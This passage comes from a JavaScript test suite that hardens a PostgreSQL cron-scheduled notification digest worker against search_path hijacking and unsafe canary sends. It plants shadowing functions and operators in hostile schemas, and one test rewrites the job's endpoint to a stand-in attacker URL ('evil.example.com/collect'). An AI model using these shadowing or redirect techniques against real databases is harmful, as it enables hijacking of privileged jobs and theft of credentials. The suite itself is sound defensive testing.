      resulttype: ['pg_type', 'typnamespace'], casttype: ['pg_type', 'typnamespace'],
      elemtype: ['pg_type', 'typnamespace'], typeId: ['pg_type', 'typnamespace'],
      relid: ['pg_class', 'relnamespace'],
      constcollid: ['pg_collation', 'collnamespace'], varcollid: ['pg_collation', 'collnamespace'],
      funccollid: ['pg_collation', 'collnamespace'], opcollid: ['pg_collation', 'collnamespace'],
      inputcollid: ['pg_collation', 'collnamespace'], collOid: ['pg_collation', 'collnamespace'],
    };
    // Everything else this tree contains, classified as carrying no resolvable name: structure,
    // indexes into other lists, flags, positions, bitmapsets, identifiers and literal payloads.
    const INERT_FIELDS = new Set([
      'alias', 'aliasname', 'arg', 'argnumber', 'args', 'canSetTag', 'checkAsUser', 'colnames',
      'commandType', 'constbyval', 'constisnull', 'constlen', 'constraintDeps', 'consttypmod',
      'constvalue', 'cteList', 'distinctClause', 'eref', 'expr', 'fromlist', 'funcformat',
      'funcretset', 'funcvariadic', 'groupClause', 'groupDistinct', 'groupingSets', 'hasAggs',
      'hasDistinctOn', 'hasForUpdate', 'hasGroupRTE', 'hasModifyingCTE', 'hasRecursive',
      'hasRowSecurity', 'hasSubLinks', 'hasTargetSRFs', 'hasWindowFuncs', 'havingQual', 'inFromCl',
      'inh', 'insertedCols', 'isReturn', 'jointree', 'lateral', 'limitCount', 'limitOffset',
      'limitOption', 'location', 'mergeActionList', 'mergeJoinCondition',
      // an INDEX into the rangetable, exactly like resultRelation — the target's OID lives on the RTE
      'mergeTargetRelation', 'name', 'onConflict',
      'operName', 'opretset', 'override', 'perminfoindex', 'quals', 'querySource', 'relkind',
      'rellockmode', 'requiredPerms', 'resjunk', 'resname', 'resno', 'resorigcol', 'resorigtbl',
      'ressortgroupref', 'resultRelation', 'returningList', 'returningNewAlias', 'returningOldAlias',
      'rowMarks', 'rtable', 'rtekind', 'rteperminfos', 'rtindex', 'securityQuals', 'selectedCols',
      'setOperations', 'sortClause', 'stmt_len', 'stmt_location', 'subLinkId', 'subLinkType',
      'subselect', 'tablesample', 'targetList', 'testexpr', 'updatedCols', 'utilityStmt', 'varattno',
      'varattnosyn', 'varlevelsup', 'varno', 'varnosyn', 'varnullingrels', 'varreturningtype',
      'vartypmod', 'windowClause', 'withCheckOptions',
    ]);

    const fieldsPresent = [...new Set([...neutral.ev_action.matchAll(/:([a-zA-Z_]+) /g)].map((m) => m[1]))];
    const unclassified = fieldsPresent.filter((f) => !(f in OID_FIELDS) && !INERT_FIELDS.has(f));
    rec('every field in the parse tree is classified as OID-bearing or inert',
      unclassified.length === 0,
      unclassified.length ? `unclassified field(s): ${unclassified.join(' ')} — decide whether each carries a resolvable name`
        : `${fieldsPresent.length} fields, ${fieldsPresent.filter((f) => f in OID_FIELDS).length} OID-bearing`);

    const planted = [], unshadowable = [], covered = new Set();

    // NEEDED is derived from the TREE, before and independently of any planting. Computing it inside
    // the planting loops was a hole: disabling a loop removed the requirement along with the rival,
    // and the coverage assertion stayed green over a comparison that had gone blind. What the
    // command binds is a property of the command; what has a rival is a property of the fixture.
    const needed = new Set(), exempt = [];
    const byCatalog = { pg_operator: new Set(), pg_proc: new Set(), pg_type: new Set(),
                        pg_class: new Set(), pg_collation: new Set() };
    for (const [field, [table, col]] of Object.entries(OID_FIELDS)) {
      const vals = [...new Set([...neutral.ev_action.matchAll(new RegExp(`:${field} (\\d+)`, 'g'))]
        .map((m) => Number(m[1])))].filter((n) => n > 0);
      if (!vals.length) continue;
      // WHY THESE ARE EXEMPT, stated correctly. An earlier version said they are "assigned by the
      // parser, never written in the command" — which is not something the analyzed tree records, and
      // is false in general: `NULL::record` names a pseudo-type explicitly and `COLLATE "default"`
      // names a collation explicitly. The true reason is narrower and checkable: no rival can be
      // CONSTRUCTED for them here — a pseudo-type is not a valid domain base type. So they are
      // exempted from the RIVAL accounting, printed rather than dropped, and the thing that actually
      // establishes coverage is the positive control below, which does not depend on this reasoning
      // at all: it removes each qualification the command carries and proves the detector fires.
      // The `implicit` predicate is chosen per catalog rather than written as one polymorphic CASE:
      // PostgreSQL parses every branch, so referencing o.typtype while scanning pg_proc is an
      // undefined-column error, not a skipped branch.
      const implicitExpr = { pg_type: "(o.typtype = 'p')", pg_collation: "(o.collname = 'default')" }[table] ?? 'false';
      const { rows } = await c.query(
        `SELECT o.oid::int AS oid, ${implicitExpr} AS implicit
           FROM ${table} o JOIN pg_namespace n ON n.oid = o.${col}
          WHERE o.oid = ANY($1::oid[]) AND n.nspname = 'pg_catalog'`, [vals]);
      for (const r of rows) {
        if (r.implicit) {
          exempt.push(`${table}:${r.oid} — no rival can be CONSTRUCTED for it (a pseudo-type is not a valid domain base type); coverage for names that ARE written comes from the positive control below`);
          continue;
        }
        needed.add(`${table}:${r.oid}`); byCatalog[table].add(r.oid);
      }
    }
    const opOids = [...byCatalog.pg_operator], funcOids = [...byCatalog.pg_proc],
          typeOids = [...byCatalog.pg_type];
    for (const oid of opOids) {
      const { rows } = await c.query(`
        SELECT o.oprname, o.oprleft::regtype::text AS l, o.oprright::regtype::text AS r,
               o.oprresult::regtype::text AS res, n.nspname
          FROM pg_operator o JOIN pg_namespace n ON n.oid = o.oprnamespace WHERE o.oid = $1`, [oid]);
      const o = rows[0];
      if (!o) { unshadowable.push(`opno ${oid} (not found)`); continue; }
      if (o.nspname !== 'pg_catalog') continue;   // already unambiguous
      try {
        const h = `op_${oid}`;
        await c.query(`CREATE FUNCTION redirect.${h}(${o.l}, ${o.r}) RETURNS ${o.res}
            LANGUAGE plpgsql AS $$ BEGIN RAISE EXCEPTION 'REDIRECTED: ${o.oprname}'; END $$;
          CREATE OPERATOR redirect.${o.oprname} (LEFTARG = ${o.l}, RIGHTARG = ${o.r}, FUNCTION = redirect.${h})`);
        planted.push(`${o.oprname}(${o.l},${o.r})`); covered.add(`pg_operator:${oid}`);
      } catch (e) { unshadowable.push(`operator ${o.oprname}(${o.l},${o.r}): ${e.message.split('\n')[0]}`); }
    }
    for (const oid of funcOids) {
      const { rows } = await c.query(`
        SELECT p.proname, n.nspname, p.prorettype::regtype::text AS res, p.provariadic,
               pg_get_function_identity_arguments(p.oid) AS args
          FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace WHERE p.oid = $1`, [oid]);
      const f = rows[0];
      if (!f) { unshadowable.push(`funcid ${oid} (not found)`); continue; }
      if (f.nspname !== 'pg_catalog') continue;
      if (f.provariadic) {
        // A VARIADIC "any" signature cannot be duplicated, and an exact-arity overload is what a real
        // attack uses anyway — so this counts as covered ONLY IF such a rival really exists in
        // `shadow`, which is in the hostile path for this check. Marking every variadic covered
        // regardless was false coverage: a future unqualified `concat` would have been declared safe
        // with nothing planted for it at all.
        //
        // UNPINNABLE BY CONSTRUCTION, and said so rather than left looking tested: this command
        // reaches exactly one variadic function and that one HAS a rival, so removing the check
        // changes no result today. It only differs for a command that does not exist yet, which is
        // precisely when it matters. src/test/notif10cbActivationPreflight.test.ts pins it
        // structurally instead.
        // NAME ONLY, and that is a stated limitation rather than an oversight: this does not compare
        // the rival's arity or argument types against the CALL, so a same-named rival that could not
        // actually compete would still count here. Deriving the call's signature means walking the
        // FuncExpr's argument list — parsing the node tree, which is the habit this check exists to
        // break. The positive control below is what proves detection for this name, by un-qualifying
        // it and requiring the tree to move; this accounting is the secondary, cheaper signal.
        const { rows: rival } = await c.query(
          `SELECT 1 FROM pg_proc p JOIN pg_namespace n ON n.oid = p.pronamespace
            WHERE n.nspname = 'shadow' AND p.proname = $1 AND p.provariadic = 0`, [f.proname]);
        if (rival.length) {
          covered.add(`pg_proc:${oid}`);
          unshadowable.push(`${f.proname}(${f.args}) — VARIADIC; covered by the exact-arity rival in \`shadow\``);
        } else {
          unshadowable.push(`${f.proname}(${f.args}) — VARIADIC and NO exact-arity rival exists; plant one in \`shadow\``);
        }
        continue;
      }
      try {
        await c.query(`CREATE FUNCTION redirect.${f.proname}(${f.args}) RETURNS ${f.res}
          LANGUAGE plpgsql AS $$ BEGIN RAISE EXCEPTION 'REDIRECTED: ${f.proname}'; END $$`);
        planted.push(`${f.proname}(${f.args})`); covered.add(`pg_proc:${oid}`);
      } catch (e) { unshadowable.push(`${f.proname}(${f.args}): ${e.message.split('\n')[0]}`); }
    }
    for (const oid of typeOids) {
      const { rows } = await c.query(
        `SELECT t.typname, n.nspname FROM pg_type t JOIN pg_namespace n ON n.oid = t.typnamespace WHERE t.oid = $1`, [oid]);
      const t = rows[0];
      if (!t || t.nspname !== 'pg_catalog') continue;
      try {
        await c.query(`CREATE DOMAIN redirect.${t.typname} AS pg_catalog.${t.typname}`);
        planted.push(`type ${t.typname}`); covered.add(`pg_type:${oid}`);
      } catch (e) { unshadowable.push(`type ${t.typname}: ${e.message.split('\n')[0]}`); }
    }

    const uncovered = [...needed].filter((n) => !covered.has(n));
    rec('every name the scheduled command binds has an exact-signature rival planted',
      needed.size > 0 && uncovered.length === 0,
      uncovered.length ? `no rival for ${uncovered.join(' ')} — the comparison below is blind to it`
        : needed.size ? `planted: ${planted.join(' ')}` : 'the tree bound nothing — the extraction is broken');
    // NO SILENT CAPS. What could not be shadowed is named, with the reason.
    // NO SILENT CAPS. Everything not directly shadowed is printed with the reason, and only two
    // reasons are acceptable: a VARIADIC signature that cannot be duplicated but HAS an exact-arity
    // rival, and a name for which no rival can be CONSTRUCTED (a pseudo-type is not a valid domain
    // base type). Neither reason is "the parser assigned it" — that was refuted: `NULL::record` and
    // `COLLATE "default"` name both explicitly. What settles coverage is the positive control.
    rec('...and nothing was silently left uncovered',
      unshadowable.every((u) => u.includes('covered by the exact-arity rival')),
      [...unshadowable, ...exempt].join(' | '));

    let hostile = null, err = null;
    try { hostile = await buildUnder('redirect, shadow, pg_catalog, public'); }
    catch (e) { err = e.message.split('\n')[0]; }
    finally { await c.query(`SET search_path = "$user", public`).catch(() => {}); }

    rec('the scheduled command binds IDENTICALLY under a hostile search_path',
      !err && hostile?.ev_action === neutral.ev_action,
      err ?? (hostile?.ev_action === neutral.ev_action ? ''
        : `the parse tree changed — deparse was:\n      neutral: ${neutral.def?.replace(/\s+/g, ' ')}\n      hostile: ${hostile?.def?.replace(/\s+/g, ' ')}`));


    // ── THE POSITIVE CONTROL, which is what actually settles coverage ────────
    //
    // Everything above answers "did anything move?". This answers the question that matters: "would
    // this detector NOTICE if a protection were dropped?" — and it answers it per protection, derived
    // from the command rather than from a list.
    //
    // It also replaces an argument that could not be won. Whether a given pg_catalog name has a
    // usable rival is genuinely hard to establish: `jsonb_build_object(VARIADIC "any")` cannot be
    // duplicated at all, so no rival proves anything about it by existing. But un-qualifying it and
    // watching the tree move proves exactly what the coverage accounting was trying to approximate.
    //
    // The three forms below are THIS BUNDLE'S OWN qualification syntax, not arbitrary SQL, so
    // matching them is reading our own convention rather than parsing PostgreSQL.
    {
      const forms = [
        [/pg_catalog\.([a-z_]+)\(/g, (m) => `${m[1]}(`, 'function'],
        [/OPERATOR\(pg_catalog\.([^)]+)\)/g, (m) => ` ${m[1]} `, 'operator'],
        [/::pg_catalog\.([a-z_0-9]+)/g, (m) => `::${m[1]}`, 'cast'],
      ];
      let controls = 0, missed = [];
      for (const [re, repl, kind] of forms) {
        for (const m of [...CMD_SELECT.matchAll(re)]) {
          const weakened = CMD_SELECT.slice(0, m.index) + repl(m) + CMD_SELECT.slice(m.index + m[0].length);
          controls++;
          try {
            await c.query(`SET search_path = ''`);
            await c.query(`CREATE OR REPLACE VIEW public._cmd_probe AS ${weakened}`);
            const a = (await c.query(`SELECT ev_action FROM pg_rewrite WHERE ev_class='public._cmd_probe'::regclass`)).rows[0].ev_action;
            await c.query(`SET search_path = redirect, shadow, pg_catalog, public`);
            await c.query(`CREATE OR REPLACE VIEW public._cmd_probe AS ${weakened}`);
            const b = (await c.query(`SELECT ev_action FROM pg_rewrite WHERE ev_class='public._cmd_probe'::regclass`)).rows[0].ev_action;
            if (a === b) missed.push(`${kind} ${m[1]}`);
          } catch (e) {
            // A weakened variant that will not even build is not evidence either way — say so.
            missed.push(`${kind} ${m[1]} (probe failed: ${e.message.split('\n')[0]})`);
          } finally { await c.query(`SET search_path = "$user", public`).catch(() => {}); }
        }
      }
      await c.query(`DROP VIEW IF EXISTS public._cmd_probe`);
      rec('the detector FIRES on every qualification the command carries, one at a time',
        controls > 0 && missed.length === 0,
        missed.length ? `un-qualifying these changed nothing, so the detector is blind to them: ${missed.join(', ')}`
          : `${controls} qualifications, each independently detected when removed`);
    }

    await c.query(`DROP VIEW IF EXISTS public._cmd_ast; DROP SCHEMA IF EXISTS redirect CASCADE`);
  }

  // ...and the scheduled command must be safe on its OWN merits, because a cron TICK runs it under
  // the job owner's path with nothing to pin it. This executes the migration's text directly, with
  // no SET LOCAL search_path in front of it — the artifact's protection removed, so only the
  // qualification in the command itself is left standing.
  // ...run as the OPERATOR role: a production tick executes as the job's username, which is the
  // hosted non-superuser — the same privileges this harness's operator connection holds.
  await seedBaseline();
  await c.query(`DELETE FROM shadow.captured`);
  await op.query(`SET search_path = shadow, pg_catalog, public`);
  try {
    await op.query(`DO $do$ DECLARE v bigint; BEGIN EXECUTE $cmd_under_test$${REVIEWED.command}$cmd_under_test$ INTO v; END $do$;`);
    const captured = (await c.query(`SELECT count(*)::int AS n FROM shadow.captured`)).rows[0].n;
    const auth = (await c.query(`SELECT headers ->> 'Authorization' AS a FROM net.http_request_queue`)).rows[0]?.a;
    rec('the SCHEDULED command is safe unaided — a tick has no SET LOCAL to protect it', captured === 0,
      `a shadowed name captured ${captured} value(s) from the command a cron tick runs`);
    rec('...and it still posts the real bearer', auth === 'Bearer stub-key-not-a-real-credential',
      auth ?? 'no Authorization header');
  } catch (e) {
    rec('the SCHEDULED command is safe unaided — a tick has no SET LOCAL to protect it', false, e.message);
  } finally {
    await op.query(`SET search_path = "$user", public`);
  }

  // An ARMED cron means the population is already being dispatched to on a schedule, so "one
  // controlled canary" is a fiction. assert-inert proves this at step 1b — four steps and two
  // switches before the send — which is exactly why it has to be proven again here. The refusal
  // now comes from the LOCK's own gate: an armed row matches nothing, so nothing is altered.
  await invokeRefuses('canary-invoke REFUSES while the cron is ARMED',
    () => c.query(`UPDATE cron.job SET active = true`),
    'or is ARMED');

  // The command hash is what makes executing the stored text safe at all. Drift must stop the send.
  await invokeRefuses('canary-invoke REFUSES a job whose command has DRIFTED',
    () => c.query(`UPDATE cron.job SET command = replace(command,
      'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker',
      'https://evil.example.com/collect')`),
    'posts to the reviewed notification-digest-worker endpoint');

  // A drift that passes every NAMED assertion and only the whole-command hash catches: the same
  // endpoint, the same Vault read, one extra harmless-looking clause. Without this the scenario
  // above would keep passing with the hash assertion deleted.
  await invokeRefuses('canary-invoke REFUSES a drift only the whole-command HASH can see',
    () => c.query(`UPDATE cron.job SET command = command || $x$ -- appended$x$`),
    'EXACTLY the reviewed command');

  // Engine off → an empty dispatch run: a 200, a `succeeded` status, and nothing sent. That is the
  // state a canary exists to distinguish from a working one.
  await invokeRefuses('canary-invoke REFUSES while the engine is OFF',
    () => c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`),
    'the digest engine is ENABLED for open_slots_player');

  await invokeRefuses('canary-invoke REFUSES when another event has the engine on',
    () => c.query(`INSERT INTO public.notification_event_types (key, supports_digest, digest_engine_enabled)
                   VALUES ('session_reminder_player', true, true)`),
    'no event other than the cutover event');

  await invokeRefuses('canary-invoke REFUSES with a dispatch run already in flight',
    () => c.query(`INSERT INTO public.notification_worker_runs (run_id, worker, channel, phase, started_at)
                   VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', now())`),
    'no dispatch run is in flight');

  // THE BLAST RADIUS. "Canary: one recipient" was a hope until this: the worker sends to every group
  // it can claim, so a backlog left by an earlier rollout would go out on the first invocation.
  await invokeRefuses('canary-invoke REFUSES when live groups exceed the ceiling',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      SELECT gen_random_uuid(), jsonb_build_object('live', i), 'hash-live-' || i, 'email',
             'open_slots_player', 'rk-live-' || i, 'fp-live-' || i, 'Europe/Amsterdam', now(), now(), 'pending'
        FROM generate_series(1, 2) i`),
    'the canary can reach at most');

  // ...and the work that does not exist as a group YET. Materialization runs INSIDE the invocation,
  // so counting only existing groups would miss everything the same run is about to form.
  await invokeRefuses('canary-invoke REFUSES when ungrouped pending digest work exceeds the ceiling',
    () => c.query(`
      INSERT INTO public.notification_outbox
        (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode)
      SELECT 'open_slots_player', 'email', gen_random_uuid(), 'idem-forming-' || i, 'pending', 'digest'
        FROM generate_series(1, 2) i`),
    'the canary can reach at most');

  // SCOPE PINNED IN BOTH DIRECTIONS. Without this the ceiling could be a constant refusal and every
  // scenario above would still be green.
  //
  // The two groups here are DUE cutover work, so this doubles as the floor's "more than one item is
  // still fine" case. Their timezone is the fixture zone rather than Europe/Amsterdam: the floor
  // reads quiet hours now, and a wall-clock-dependent fixture would make this scenario green in the
  // afternoon and red at night for a reason that has nothing to do with the ceiling.
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
    SELECT gen_random_uuid(), jsonb_build_object('live', i), 'hash-live-' || i, 'email',
           'open_slots_player', 'rk-live-' || i, 'fp-live-' || i, '${middayTz}', now(), now(), 'pending'
      FROM generate_series(1, 2) i`);
  {
    const err = await canaryInvoke(2);
    rec('canary-invoke ALLOWS the same world under an explicitly raised ceiling', err === null, err ?? '');
    rec('...and did queue the request', await queuedCount() === 1, `queued=${await queuedCount()}`);
  }

  // A TERMINAL group is not live work. Counting it would make the ceiling tighten permanently after
  // the first successful send, and every later canary would be refused for a backlog that is gone.
  //
  // The 20 terminal groups sit beside ONE due cutover item, deliberately. Without it this scenario
  // would now be satisfied by the FLOOR's refusal and pass while proving nothing about the ceiling —
  // the vacuous-green trap this suite keeps paying for. With it, the only thing that can refuse is
  // the ceiling counting terminal work it should ignore.
  await seedBaseline();
  await seedDueCutoverGroup();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state, terminal_at)
    SELECT gen_random_uuid(), jsonb_build_object('done', i), 'hash-done-' || i, 'email',
           'open_slots_player', 'rk-done-' || i, 'fp-done-' || i, 'Europe/Amsterdam', now(), now(),
           'sent', now()
      FROM generate_series(1, 20) i`);
  {
    const err = await canaryInvoke();
    rec('canary-invoke does not count TERMINAL groups towards the ceiling', err === null, err ?? '');
  }

  // A canary already on its way is invisible in notification_worker_runs — the run row only appears
  // when the worker STARTS. Without this the second invocation, and activation, both read clean.
  await invokeRefuses('canary-invoke REFUSES while a request to the worker is already queued',
    () => c.query(`INSERT INTO net.http_request_queue (url)
                   VALUES ('https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker')`),
    'already queued');
  // ...and it must be THAT endpoint. Every other cron in this project posts through pg_net too, so a
  // bare "the queue is empty" would refuse every canary on a healthy system. One due cutover item,
  // for the same reason as the terminal-group scenario above: without it the floor would do the
  // refusing and the endpoint discrimination would go untested.
  await seedBaseline();
  await seedDueCutoverGroup();
  await c.query(`INSERT INTO net.http_request_queue (url) VALUES ('https://example.test/functions/v1/some-other-worker')`);
  {
    const err = await canaryInvoke();
    rec('...but another worker\'s queued request does not block it', err === null, err ?? '');
  }

  // ── C-3: the DUE-WORK FLOOR, one clause at a time ────────────────────────
  //
  // The ceiling scenarios above bound how FAR the canary reaches. Everything here bounds whether it
  // reaches anything at all, and each case mutates exactly one clause of the floor's predicate away
  // from a world that passes — the same discipline as the refusal scenarios, applied to a guard
  // whose failure mode is a green empty run rather than a flood.
  const FLOOR = 'NO due, claimable open_slots_player';

  // A zone in which quiet hours are SHUT right now, whatever the wall clock says. Same device as
  // middayTz, aimed at 23:xx local instead of noon.
  const quietTz = (() => {
    let o = (23 - new Date().getUTCHours() + 24) % 24;
    if (o > 14) o -= 24;
    return o === 0 ? 'UTC' : (o > 0 ? `Etc/GMT-${o}` : `Etc/GMT+${-o}`);
  })();
  // ...and a POSIX-style zone placing "now" at an EXACT local wall-clock minute. The whole-hour
  // Etc/GMT zones cannot express "three minutes before the window shuts", which is precisely the
  // case the 5-minute operational margin exists for. POSIX's sign convention is inverted (a
  // POSITIVE offset means west of Greenwich), which is why the sign below looks backwards.
  const tzAtLocal = (hh, mm) => {
    const d = new Date();
    let off = (hh * 60 + mm) - (d.getUTCHours() * 60 + d.getUTCMinutes());   // minutes to ADD to UTC
    while (off <= -12 * 60) off += 1440;
    while (off > 14 * 60) off -= 1440;
    const a = Math.abs(off);
    return `CNY${off >= 0 ? '-' : '+'}${Math.floor(a / 60)}:${String(a % 60).padStart(2, '0')}`;
  };

  // NOT YET DUE. available_at is in the future, so the worker would materialize nothing and claim
  // nothing — the empty run again, arrived at by scheduling rather than by an empty table.
  await invokeRefuses('canary-invoke REFUSES a cutover group that is not due YET',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES (gen_random_uuid(), '{"future":1}'::jsonb, 'hash-future', 'email', 'open_slots_player',
              'rk-future', 'fp-future', '${middayTz}', now() + interval '2 hours',
              now() + interval '2 hours', 'pending')`),
    FLOOR);
  // ...and the forming half of the same thing: an ungrouped member whose digest boundary has not
  // arrived. Materialization forms a group whose available_at IS that boundary, so this row cannot
  // be sent by this invocation either.
  await invokeRefuses('canary-invoke REFUSES an ungrouped cutover member whose digest boundary has not passed',
    () => c.query(`
      INSERT INTO public.notification_outbox
        (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode,
         digest_boundary_at, recipient_timezone)
      VALUES ('open_slots_player', 'email', gen_random_uuid(), 'idem-future', 'pending', 'digest',
              now() + interval '2 hours', '${middayTz}')`),
    FLOOR);

  // ═══ THE ONE THAT MATTERS MOST ═══════════════════════════════════════════
  // An EVENT-AGNOSTIC floor would be satisfied here, invoke, and the worker would claim this due
  // group — sending a REAL email to a REAL recipient who has nothing to do with the cutover, while
  // proving nothing about open_slots_player. Both halves of the floor are checked, because the
  // forming half is the one an "it counts outbox rows too" reading would leave event-blind.
  await invokeRefuses('canary-invoke REFUSES when the only due group is for a DIFFERENT event',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES (gen_random_uuid(), '{"other":1}'::jsonb, 'hash-other', 'email', 'session_reminder_player',
              'rk-other', 'fp-other', '${middayTz}', now(), now(), 'pending')`),
    FLOOR);
  await invokeRefuses('canary-invoke REFUSES when the only due ungrouped member is for a DIFFERENT event',
    () => c.query(`
      INSERT INTO public.notification_outbox
        (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode,
         digest_boundary_at, recipient_timezone)
      VALUES ('session_reminder_player', 'email', gen_random_uuid(), 'idem-other', 'pending', 'digest',
              now(), '${middayTz}')`),
    FLOOR);

  // The FORMING half of the floor is satisfiable on its own — a canary does not need a group to
  // already exist, only work the same run will form and send.
  await seedBaseline();
  await seedDueCutoverMember();
  {
    const err = await canaryInvoke();
    rec('canary-invoke PASSES on ONE due ungrouped cutover member (materialization forms it in-run)',
      err === null, err ?? '');
    rec('...and queued the request', await queuedCount() === 1, `queued=${await queuedCount()}`);
  }

  // THE CEILING IS STILL GLOBAL. One due cutover item satisfies the floor; an unrelated live group
  // beside it still counts towards how far this invocation reaches, and at --max-recipients=1 that
  // is a refusal. If the ceiling had been narrowed to the cutover event to match the floor, a
  // backlog under any other key would ride out on the canary uncounted.
  await invokeRefuses('canary-invoke still refuses on the GLOBAL ceiling when UNRELATED live work sits beside due cutover work',
    async () => {
      await seedDueCutoverGroup();
      await c.query(`
        INSERT INTO public.notification_digest_groups
          (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
           destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
        VALUES (gen_random_uuid(), '{"unrelated":1}'::jsonb, 'hash-unrelated', 'email',
                'session_reminder_player', 'rk-unrelated', 'fp-unrelated', '${middayTz}',
                now(), now(), 'pending')`);
    },
    'the canary can reach at most');

  // QUIET HOURS. The group is due in every other respect; the recipient's window is shut, so the
  // claim would defer it and the run would end empty.
  await invokeRefuses('canary-invoke REFUSES a due cutover group whose recipient is inside QUIET HOURS',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES (gen_random_uuid(), '{"quiet":1}'::jsonb, 'hash-quiet', 'email', 'open_slots_player',
              'rk-quiet', 'fp-quiet', '${quietTz}', now(), now(), 'pending')`),
    FLOOR);
  // THE OPERATIONAL MARGIN, which a plain quiet-hours check would miss entirely: the window is OPEN
  // right now and shuts in three minutes. pg_net dispatches on COMMIT, the worker then boots and
  // materializes, and by the time it claims the window is closed — an empty run asserted valid.
  await invokeRefuses('canary-invoke REFUSES a due cutover group whose quiet-hours window shuts within 5 minutes',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES (gen_random_uuid(), '{"edge":1}'::jsonb, 'hash-edge', 'email', 'open_slots_player',
              'rk-edge', 'fp-edge', '${tzAtLocal(19, 57)}', now(), now(), 'pending')`),
    FLOOR);

  // THE BREAKER. An open circuit means the claim returns without leasing anything (or promotes a
  // single probe), so the canary would prove the breaker works, not that the cutover path does.
  await invokeRefuses('canary-invoke REFUSES while the email provider circuit is OPEN',
    async () => {
      await seedDueCutoverGroup();
      await c.query(`UPDATE public.notification_provider_circuit
                        SET state = 'open', reason = 'provider_5xx', tripped_at = now()
                      WHERE channel = 'email'`);
    },
    'email circuit NOT closed');
  // ...and ABSENT is the healthy state, not a failure. There is no circuit row until the breaker
  // first trips, so a floor demanding state = 'closed' would refuse every canary on a system that
  // has never had a provider failure — the fail-closed reading that is simply wrong here.
  await seedBaseline();
  await seedDueCutoverGroup();
  await c.query(`DELETE FROM public.notification_provider_circuit WHERE channel = 'email'`);
  {
    const err = await canaryInvoke();
    rec('...while an ABSENT circuit row is the normal closed path and PASSES', err === null, err ?? '');
  }

  // UNCERTAINTY AGED OUT. The claim's first act on such a group is to finalize it delivery_unknown
  // and CONTINUE — it is never leased and never sent. Counting it as due would assert work that the
  // worker will terminalize on its way past.
  await invokeRefuses('canary-invoke REFUSES a due-looking group whose UNCERTAINTY deadline has passed',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state,
         first_send_at, uncertain_since, uncertain_deadline_at)
      VALUES (gen_random_uuid(), '{"aged":1}'::jsonb, 'hash-aged', 'email', 'open_slots_player',
              'rk-aged', 'fp-aged', '${middayTz}', now(), now(), 'request_ready',
              now() - interval '20 hours', now() - interval '2 hours', now() - interval '1 minute')`),
    FLOOR);

  // A LEASE ANOTHER WORKER HOLDS. Not stale (15m), so the claim skips it; counting it would assert
  // due work that belongs to somebody else's run.
  await invokeRefuses('canary-invoke REFUSES when the only cutover group is LEASED and not yet stale',
    () => c.query(`
      INSERT INTO public.notification_digest_groups
        (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
         destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state,
         locked_by, locked_at)
      VALUES (gen_random_uuid(), '{"leased":1}'::jsonb, 'hash-leased', 'email', 'open_slots_player',
              'rk-leased', 'fp-leased', '${middayTz}', now(), now(), 'leased',
              'notification-digest-worker:someone-else', now())`),
    FLOOR);
  // ...and the same group with a STALE lease IS claimable — crash reclaim is real due work. Pinned
  // in both directions so the lease clause cannot degenerate into "never counts a leased group".
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state,
       locked_by, locked_at)
    VALUES (gen_random_uuid(), '{"stale":1}'::jsonb, 'hash-stale', 'email', 'open_slots_player',
            'rk-stale', 'fp-stale', '${middayTz}', now(), now(), 'leased',
            'notification-digest-worker:crashed', now() - interval '20 minutes')`);
  {
    const err = await canaryInvoke();
    rec('...while a STALE lease IS due work (crash reclaim) and PASSES', err === null, err ?? '');
  }

  // A PRE-BOUNDARY MEMBER disqualifies its whole group — a digest is delivered whole, and the claim
  // passes such a group over rather than sending it. So it is not due work, and a floor that
  // counted it would assert a send the no-backlog contract forbids.
  await invokeRefuses('canary-invoke REFUSES when the only due group holds a PRE-BOUNDARY member',
    async () => {
      await seedDueCutoverGroup();
      await c.query(`
        INSERT INTO public.notification_outbox
          (event_type, channel, recipient_person_id, idempotency_key, status, delivery_mode,
           digest_group_id, digest_boundary_at, recipient_timezone, created_at, occurred_at)
        SELECT 'open_slots_player', 'email', gen_random_uuid(), 'idem-preboundary', 'pending', 'digest',
               '${DUE_GROUP}', now(), '${middayTz}', b.boundary_at - interval '1 hour',
               b.boundary_at - interval '1 hour'
          FROM public.notification_activation_boundaries b WHERE b.path = 'email:digest'`);
    },
    FLOOR);

